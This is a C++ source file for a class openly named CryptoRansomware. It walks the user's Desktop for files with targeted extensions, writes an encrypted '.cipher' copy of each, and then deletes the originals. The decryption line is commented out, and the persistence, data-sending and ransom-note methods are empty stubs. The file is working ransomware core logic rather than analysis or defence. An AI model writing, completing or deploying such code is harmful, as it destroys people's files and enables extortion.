#include "CryptoRansomware.h"

CryptoRansomware::CryptoRansomware() {
	this->currentPath = current_path().string();
	this->seeker = InfoSeeker();
	this->userHomePath = "C:\\Users\\" + this->seeker.getUserName() + "\\Desktop";
	std::vector<std::string>::iterator it;

	for (const auto& entry : fs::recursive_directory_iterator(this->userHomePath)) {
		for (auto i : fileTypes) {
			if (entry.path().extension() == i) {
				std::cout << entry.path() << std::endl;
				this->files.push_back(entry.path());
			}
		}
	}
};

void CryptoRansomware::getPersistant() {
}
void CryptoRansomware::encryptFiles() {
	for (auto i : this->files) {
		cipher.encrypt(i.string(), i.string() + ".cipher");
		//cipher.decrypt(i.string() + ".cipher", i.replace_extension("").string());
	}
}
void CryptoRansomware::deleteFiles() {
	for (auto i : this->files) {
		remove(i);
	}
}
void CryptoRansomware::sendInfo() {
}
void CryptoRansomware::informUser() {
}